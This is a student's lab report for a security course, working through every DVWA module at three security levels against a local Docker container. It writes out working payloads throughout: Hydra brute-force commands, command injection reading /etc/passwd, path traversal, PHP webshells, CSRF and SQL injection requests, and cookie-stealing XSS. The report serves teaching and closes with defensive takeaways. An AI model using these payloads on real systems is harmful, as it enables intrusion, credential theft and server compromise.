# DVWA Security Lab Report

**Student Name:** Abdullah Shaikh
**Student ID:** as09245
**Assignment:** Application Security Testing

# Environment Setup

## Docker Installation

```bash
docker --version
```

**Result:** Docker installed successfully.

![Docker Version](images/docker_version.png)

## DVWA Deployment

```bash
docker pull vulnerables/web-dvwa
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa
```
**Verification:**

```bash
docker ps
```

**Result:** DVWA container running successfully.

![Docker PS](images/contanier_running.jpeg)

DVWA accessible at: `http://localhost:8080`
Login with **admin / password**, then click **Create / Reset Database**.

![DVWA Login](images/docker_login.png)

# Brute Force

## Security Level: Low

**Payload:**

```
Username: admin
Password: password
```

**Result:** Login successful.

![Brute Force Low](images/bruteforce_low.jpeg)

**Why it worked:** Low security applies no CAPTCHA. Credentials are checked directly which makes manual guessing work.

## Security Level: Medium

**Payload:**

```bash
hydra -l admin -P /mnt/c/Users/HP/rockyou.txt -s 8080 127.0.0.1 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:\
H=Cookie: security=medium; PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7:S=Welcome" \
  -t 1 -w 10 -V -f
```

**Result:** Login credentials found via Hydra.

![Brute Force Medium](images/bruteforce_medium.jpeg)

**Why it worked:** Medium security introduces a small time delay between failed attempts but does not lock the account or use CAPTCHA. Hydra iterates with a bunch of passwords and succeeds.

## Security Level: High

**Payload:**

```bash
hydra -l admin -P /mnt/c/Users/HP/rockyou.txt -s 8080 127.0.0.1 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login\
&user_token=fd7f99da9f6dd8f33b239fdf93be31d7:\
H=Cookie: security=high; PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7:\
F=Username and/or password incorrect" \
  -t 1 -w 10 -V -f
```

**Result:** Attack is significantly hindered by CSRF token requirement.

![Brute Force High](images/bruteforce_high.jpeg)

**Why it's harder:** High security introduces a CSRF token (`user_token`). Each login attempt requires a fresh, unpredictable token fetched from the previous page response, making static wordlist attacks with Hydra largely ineffective without a custom user token.

# Command Injection

## Security Level: Low

**Payload:**

```
127.0.0.1; ls
```

**Result:** Server executed `ls` and returned directory listing.

![Command Injection Low](images/command_injection_low.jpeg)

**Why it worked:** DVWA directly inserts the user input into a system command since at low severity.

## Security Level: Medium

**Payload:**

```
127.0.0.1 | cat /etc/passwd
```

**Result:** Contents of `/etc/passwd` returned.

![Command Injection Medium](images/command_injection_medium.jpeg)

**Why it worked:** Medium security filters `&&` and `;` but not the pipe `|` operator. Using `|` chains commands and bypasses.

## Security Level: High

**Payload:**

```
127.0.0.1 | cat /etc/passwd
```

**Result:** Injection still partially succeeds using pipe operator.

![Command Injection High](images/command_injection_high.jpeg)

**Why it worked / harder:** High security has a more extensive blacklist but certain operator combinations still work.

# Cross-Site Request Forgery (CSRF)

## Security Level: Low

**Payload:**
```
http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

**Result:** Password changed successfully without any token validation.

![CSRF Low](images/csrf_low.jpeg)

**Why it worked:** Low security processes the password change request with no CSRF token check. The password change is triggered simply by visiting a crafted URL.

## Security Level: Medium

**Payload:**

```bash
curl -v --referer "http://127.0.0.1:8080/vulnerabilities/csrf/" \
  "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pwn&password_conf=pwn&Change=Change" \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=medium"
```

**Result:** Password changed.

![CSRF Medium](images/csrf_medium.jpeg)

**Why it worked:** It worked because the application does not properly verify whether the password change request is legitimate. An attacker can directly send a crafted request to the server, and the server processes it without confirming that it came from a trusted action by the user.

## Security Level: High

**Payload:**

```bash
curl "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pwn\
&password_conf=pwn&Change=Change&user_token=140f4003b7a890dbc1cd50f23e0a0c5a" \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=high"
```

**Result:** Requires a valid, one-time CSRF token per request.

![CSRF High](images/csrf_high.jpeg)

**Why it's harder:** High security requires a valid `user_token` that is unique per session and per request.

# File Inclusion

## Security Level: Low

**Payload:**

```
http://localhost:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

**Result:** Contents of `/etc/passwd` displayed in the browser.

![File Inclusion Low](images/file_inclusion_low.jpeg)

**Why it worked:** The page parameter is used directly in the include() function without checking the path. This lets attackers use ../ to access files outside the web directory.

## Security Level: Medium

**Payload:**

```
http://localhost:8080/vulnerabilities/fi/?page=....//....//....//....//....//etc/passwd
```

**Result:** bypass succeeded.

![File Inclusion Medium](images/file_inclusion_medium.jpeg)

**Why it worked:** Medium security strips `../` from the input, but does so only once. Using `....//` causes the filter to remove the inner `../`.

## Security Level: High

**Payload:**

```
http://localhost:8080/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php
```

**Result:** Accessed a local file using the `file://`.

![File Inclusion High](images/file_inclusion_high.jpeg)

**Why it worked:** High security blocks `../` traversal but still permits PHP files like `file://`. 

# File Upload

## Security Level: Low

**Payload — `shell.php`:**

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**Result:** PHP webshell uploaded and executed successfully.

![File Upload Low](images/file_upload_low.jpeg)

**Why it worked:** Low security performs no validation on uploaded files. Any file type is accepted and stored directly on the server.

## Security Level: Medium

**Payload:**

```bash
curl -v -F "uploaded=@shell2.php;type=image/jpeg" \
  -F "Upload=Upload" \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=medium" \
  http://127.0.0.1:8080/vulnerabilities/upload/
```

**Result:** PHP shell uploaded type to `image/jpeg`.

![File Upload Medium](images/file_upload_medium.jpeg)

**Why it worked:** Medium security only checks the file information sent by the user. Since this can be easily changed, an attacker can upload a .php file by pretending it is an image.

## Security Level: High

**Payload — `shell3.jpg`:**

```
GIF89a;
<?php system($_REQUEST["cmd"]); ?>
```

```bash
curl -v -F "uploaded=@/home/abdullah/shell3.jpg;type=image/jpeg" \
  -F "Upload=Upload" \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=high" \
  http://127.0.0.1:8080/vulnerabilities/upload/
```

**Result:** file accepted..

![File Upload High](images/file_upload_high.jpeg)

**Why it worked:** High security checks bothE type and file extension. Prepending the GIF magic bytes (`GIF89a;`) makes the file appear to be a valid image.

# Insecure CAPTCHA

## Security Level: Low

**Method:** In browser DevTools → Network tab, intercept the form submission and manually change `step=1` to `step=2` in the request payload.

**Result:** Password changed by skipping the CAPTCHA verification step entirely.

![Insecure CAPTCHA Low](images/insecure_captcha_low_1.jpeg)
![Insecure CAPTCHA Low](images/insecure_captcha_low_2.jpeg)

**Why it worked:** Low security uses a two-step process but does not enforce that step 1 (CAPTCHA verification) was actually completed before processing step 2 (password change).

## Security Level: Medium

**Payload:**

```bash
curl -X POST http://127.0.0.1:8080/vulnerabilities/captcha/ \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=medium" \
  -d "step=2&password_new=pwn&password_conf=pwn\
&g-recaptcha-response=&Change=Change&passed_captcha=true"
```

**Result:** Password changed.

![Insecure CAPTCHA Medium](images/insecure_captcha_medium.jpeg)

**Why it worked:** Medium security checks for a `passed_captcha` parameter in the data to determine if CAPTCHA was solved. 

## Security Level: High

**Payload:**

```bash
curl -v -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=high" \
  -d "step=1&password_new=pwn&password_conf=pwn\
&g-recaptcha-response=hidd3n_valu3\
&user_token=ff1fe1da0cc25ea226aa57e9c2ecb6d9&Change=Change" \
  http://127.0.0.1:8080/vulnerabilities/captcha/
```

**Result:** Bypass using a hidden CAPTCHA response value embedded in the source code.

![Insecure CAPTCHA High](images/insecure_captcha_high.jpeg)

**Why it worked:** High security validates the CAPTCHA response server-side but uses a hardcoded fallback value (`hidd3n_valu3`) in the source, which was discovered by inspecting the page HTML. 

# SQL Injection

## Security Level: Low

**Payload:**

```sql
1' OR '1'='1
```

**Result:** All user records returned from the database.

![SQL Injection Low](images/sql_injection_low.jpeg)

**Why it worked:** User input is concatenated directly into the SQL query which always evaluates to true.

## Security Level: Medium

**Payload:**

```bash
curl -X POST http://127.0.0.1:8080/vulnerabilities/sqli/ \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=medium" \
  -d "id=1 OR 1=1#&Submit=Submit"
```

**Result:** All records returned via POST-based injection.

![SQL Injection Medium](images/sql_injection_medium.jpeg)

**Why it worked:** Medium security treats the ID parameter as an integer so numeric injection bypasses the filter entirely.

## Security Level: High

**Payload:**

```sql
0' UNION SELECT first_name, password FROM users #
```

**Result:** Usernames and password hashes extracted..

![SQL Injection High](images/sql_injection_high.jpeg)

**Why it worked:**  The UNION statement appends a second query to dump the users table.

# SQL Injection (Blind)

## Security Level: Low

**Payload:**

```sql
1' AND 1=1 #
```

**Result:** Page returned normally, confirming the condition is true (user ID 1 exists).

![SQL Injection Blind Low](images/sqli_blind_low.png)

**Why it worked:** No parameterization is used. The injected boolean condition is evaluated by the database. A true condition returns user data; a false condition (e.g., `1=2`) returns nothing — confirming blind injection is possible.

---

## Security Level: Medium

**Payload:**

```bash
curl -X POST http://127.0.0.1:8080/vulnerabilities/sqli_blind/ \
  -b "PHPSESSID=1vh43vkr2fjatjuoqteqiq05r7; security=medium" \
  -d "id=1 OR 1=1#&Submit=Submit"
```

**Result:** Boolean-based blind injection confirmed via POST.

![SQL Injection Blind Medium](images/sqli_blind_medium.png)

**Why it worked:** Same as Low — the integer-type ID parameter is not quoted in the query, so `mysql_real_escape_string()` provides no protection against numeric injection.

---

## Security Level: High

**Payload:**

```sql
1' AND 1=1#
```

**Result:** Condition evaluated successfully; response confirms true/false inference.

![SQL Injection Blind High](images/sqli_blind_high.png)

**Why it worked:** High security uses a cookie-based input instead of a POST field, but the SQL query itself remains injectable. Manually crafting requests with the injected cookie value bypasses the interface-level obfuscation.

---

# Weak Session IDs

## Security Level: Low

**Observation:** Session IDs are simple incrementing integers (1, 2, 3...).

**Result:** An attacker can enumerate valid session IDs by guessing sequential values.

![Weak Session IDs Low](images/session_ids_low.png)

**Why it's a vulnerability:** Predictable session IDs allow session hijacking — an attacker who observes one valid session ID can trivially guess neighboring valid sessions.

---

## Security Level: Medium

**Observation:** Session IDs are generated using the current Unix timestamp.

**Result:** IDs are time-based and predictable within a narrow window.

![Weak Session IDs Medium](images/session_ids_medium.png)

**Why it's a vulnerability:** While less obvious than sequential integers, timestamp-based IDs have limited entropy. An attacker who knows approximately when a session was created can brute-force a small range of timestamps.

---

## Security Level: High

**Observation:** Session IDs appear random (MD5 hash), but the source remains deterministic (timestamp-based seed).

**Result:** The ID looks random but is derived from a predictable value, offering false security.

![Weak Session IDs High](images/session_ids_high.png)

**Why it's a vulnerability:** Hashing a predictable value (current time) does not add true randomness. A cryptographically secure random number generator (`openssl_random_pseudo_bytes`) should be used instead.

---

# XSS (DOM)

## Security Level: Low

**Payload:**

```
http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

**Result:** Alert box fired in the browser.

![XSS DOM Low](images/xss_dom_low.png)

**Why it worked:** The `default` URL parameter is read directly via JavaScript (`document.location`) and written into the DOM without sanitization using `document.write()` or `innerHTML`, causing the script tag to execute.

---

## Security Level: Medium

**Payload:**

```
http://localhost:8080/vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>
```

**Result:** Alert fired using an image error event handler.

![XSS DOM Medium](images/xss_dom_medium.png)

**Why it worked:** Medium security blocks `<script>` tags but not other HTML tags with event handlers. An `<img>` tag with `onerror` attribute executes JavaScript when the image fails to load.

---

## Security Level: High

**Payload:**

```
http://127.0.0.1:8080/vulnerabilities/xss_d/?default=English#%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

**Result:** Payload placed after the URL fragment (`#`) to bypass server-side filtering.

![XSS DOM High](images/xss_dom_high.png)

**Why it worked:** High security sanitizes the `default` query parameter server-side, but content after the `#` (URL fragment) is never sent to the server — it is processed only by the browser's JavaScript. If the client-side code reads `location.hash`, the payload executes unfiltered.

---

# XSS (Reflected)

## Security Level: Low

**Payload:**

```
http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

**Result:** Script executed immediately upon page load.

![XSS Reflected Low](images/xss_reflected_low.png)

**Why it worked:** The `name` parameter is reflected directly into the HTML response without any encoding or sanitization.

---

## Security Level: Medium

**Payload:**

```html
<img src=x onerror=alert(1)>
```

**Result:** Alert triggered via image error handler.

![XSS Reflected Medium](images/xss_reflected_medium.png)

**Why it worked:** Medium security strips `<script>` tags using a basic string replacement, but leaves other HTML tags unfiltered. Event handler attributes on arbitrary tags still execute JavaScript.

---

## Security Level: High

**Payload:**

```html
<img src="pwn" onerror=alert(document.cookie)>
```

**Result:** Cookie value alerted, demonstrating session theft potential.

![XSS Reflected High](images/xss_reflected_high.png)

**Why it worked:** High security uses a whitelist approach for some tags but the implementation still permits certain attribute-based execution vectors. Using `alert(document.cookie)` demonstrates real-world impact beyond a simple `alert(1)`.

---

# XSS (Stored)

## Security Level: Low

**Payload (message field):**

```html
<script>alert(1)</script>
```

**Result:** Script executes for every user who views the page.

![XSS Stored Low](images/xss_stored_low.png)

**Why it worked:** The message is stored in the database and rendered back into the page with no HTML encoding, causing persistent script execution for all visitors.

---

## Security Level: Medium

**Payload:**

```
Name:    abd
Message: <img src=x onerror=alert(1)>
```

**Result:** Persistent XSS via image tag stored in the database.

![XSS Stored Medium](images/xss_stored_medium.png)

**Why it worked:** Medium security filters `<script>` in the message field but does not sanitize HTML event handlers on other elements. The `<img onerror>` payload persists and fires for every page visitor.

---

## Security Level: High

**Method:** Used browser DevTools to increase the `maxlength` attribute of the name input field, then submitted:

```html
<body onload=alert('1')>
```

**Result:** Persistent XSS stored and executed via the `onload` event on the `<body>` tag.

![XSS Stored High](images/xss_stored_high.png)

**Why it worked:** High security enforces a character limit on the name field client-side, but this restriction only exists in the browser's HTML. Modifying the DOM attribute bypasses the limit. The server does not re-validate the length or sanitize event handler attributes on `<body>`.

---

# CSP Bypass

## Security Level: Low

**Method:** The CSP policy at Low level allows scripts from external sources or `unsafe-inline`. A custom JavaScript file `csp.js` was hosted/uploaded with the content:

```javascript
alert("CSP Bypass Successful");
```

**Result:** External script executed, demonstrating the weak CSP allows untrusted sources.

![CSP Bypass Low](images/csp_low.png)

**Why it worked:** The Content Security Policy at low level is permissive — it allows `script-src *` or includes `unsafe-inline`, meaning any script source or inline script is permitted.

---

## Security Level: Medium

**Payload:**

```html
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

**Result:** Script executed by reusing the nonce exposed in the page source.

![CSP Bypass Medium](images/csp_medium.png)

**Why it worked:** The CSP uses a static nonce value that is hardcoded in the page source rather than being regenerated per request. Once the nonce is read from the HTML, it can be reused indefinitely in injected scripts.

---

## Security Level: High

**Method:** In browser DevTools → Network tab, clicked Submit to trigger a request to `json.php?callback=solveSum`. Opened that URL in a new tab and replaced the `callback` parameter value with:

```
alert("1")//
```

**Result:** The JSONP callback executed arbitrary JavaScript.

![CSP Bypass High](images/csp_high.png)

**Why it worked:** The page uses a JSONP endpoint (`json.php?callback=`) to load data. The CSP whitelists this same domain as a trusted script source. Since the callback parameter is reflected into the script response, it becomes a CSP-compliant script execution vector — the browser trusts it because it appears to come from a whitelisted source.

---

# JavaScript

## Security Level: Low

**Method:** Opened browser DevTools Console and ran:

```javascript
generate_token()
```

Then clicked Submit.

**Result:** Valid token generated client-side, form accepted.

![JavaScript Low](images/javascript_low.png)

**Why it worked:** Token generation logic is fully exposed in the client-side JavaScript. Calling the function manually produces a valid token that the server accepts, as there is no server-side token validation.

---

## Security Level: Medium

**Method:** In browser DevTools Console, ran:

```javascript
do_elsesomething("XX")
```

Then clicked Submit.

**Result:** Token set to the expected value, form submitted successfully.

![JavaScript Medium](images/javascript_medium.png)

**Why it worked:** Medium security obfuscates the JavaScript slightly but the token generation function is still present in the source. Calling the internal function directly from the console bypasses the intended user flow.

---

## Security Level: High

**Method:** Reversed the token generation algorithm from the source:
1. Start with the phrase `success`
2. Prepend `XX` → `XXsuccess`
3. SHA256 hash → intermediate hash
4. Append `ZZ` → `{hash}ZZ`
5. SHA256 hash again → final token

**Final token:**

```
ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84
```

**Payload:**

```bash
curl -X POST "http://localhost:8080/vulnerabilities/javascript/" \
  -d "token=ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84\
&phrase=success&send=Submit" \
  -H "Cookie: PHPSESSID=vdo9sbstlrjtqjud44gcrfh0v2; security=high"
```

**Result:** Server accepted the manually computed token.

![JavaScript High](images/javascript_high.png)

**Why it worked:** High security obfuscates the token generation using a double SHA256 chain, but since this logic runs entirely in the browser, it can be reverse-engineered by reading the JavaScript source. Security controls that rely solely on client-side secrecy are fundamentally flawed.

---

# Analysis & Comparison

## Vulnerability Behavior Across Security Levels

| Vulnerability | Low | Medium | High |
|---|---|---|---|
| Brute Force | No protection | Time delay only | CSRF token required |
| Command Injection | Direct execution | Partial blacklist | Stronger blacklist |
| CSRF | No token | Referer check | CSRF token required |
| File Inclusion | Direct traversal | Single-pass filter | Wrapper bypass |
| File Upload | No validation | MIME check only | Magic byte check |
| Insecure CAPTCHA | Step skip | Client param injection | Hardcoded value |
| SQL Injection | No sanitization | Integer bypass | Interface obfuscation |
| SQL Injection Blind | No sanitization | Integer bypass | Cookie-based input |
| Weak Session IDs | Sequential ints | Unix timestamp | Hashed timestamp |
| XSS DOM | `<script>` works | Tag bypass needed | Fragment bypass |
| XSS Reflected | `<script>` works | Tag bypass needed | Event handler |
| XSS Stored | `<script>` works | Tag bypass needed | Length bypass |
| CSP Bypass | Permissive policy | Static nonce | JSONP abuse |
| JavaScript | Exposed function | Obfuscated function | Reverse engineering |

## Key Takeaways

**Blacklists fail.** Every medium-level filter that blocked specific characters or tags was bypassed using alternative syntax. Whitelists (allowing only known-safe values) are far more robust.

**Client-side controls are not security.** CAPTCHA step skipping, JavaScript token generation, session ID prediction, and input length limits — all of these exist only in the browser and can be trivially bypassed by any attacker with DevTools.

**Parameterized queries are the only real SQL injection fix.** Both medium and high SQL injection levels were bypassed because they still used string concatenation. Prepared statements with bound parameters would have prevented all three levels.

**CSP requires careful configuration.** A CSP is only as strong as its most permissive rule. Static nonces and JSONP whitelisting both undermined what appeared to be a security-conscious policy.

**Defense in depth is essential.** No single control is sufficient. High security in DVWA is still intentionally vulnerable — real applications must combine input validation, output encoding, CSP, secure session management, and server-side enforcement to be resilient.

---

> ⚠️ **Disclaimer:** All testing was performed exclusively on a local DVWA Docker container for educational purposes. No external systems were targeted. Unauthorized penetration testing is illegal and unethical.